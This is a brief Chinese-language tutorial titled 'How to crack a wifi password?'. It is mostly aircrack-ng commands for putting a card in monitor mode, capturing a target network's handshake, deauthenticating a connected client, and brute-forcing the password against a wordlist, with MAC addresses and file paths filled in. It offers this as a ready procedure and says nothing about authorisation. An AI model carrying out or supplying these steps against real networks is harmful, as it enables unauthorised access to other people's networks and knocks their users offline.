# 如何破解wifi密码？

## aircrack-ng 命令的详细解释

sudo -i  ：管理员权限

ifconfig ：查看当前的网卡信息

airmon-ng：检查网卡是否支持监听功能的

airmon-ng start wlan0 ：激活无线网卡的监听模式

airodump-ng wlan0 ：扫描当前周边环境的WiFi信号

下面里的部分信息根据自己的情况进行替换

抓包命令：airodump-ng -c 11 –bssid 60:32:B1:56:3F:B2 -w /home/lingdu/桌面/handshake wlan0

ACK 死亡攻击：aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c F0:72:EA:E8:72:21 wlan0

暴力破解命令：
aircrack-ng -w /home/lingdu/桌面/password.txt -b 60:32:B1:56:3F:B2 /home/lingdu/桌面/handshake-0*.cap
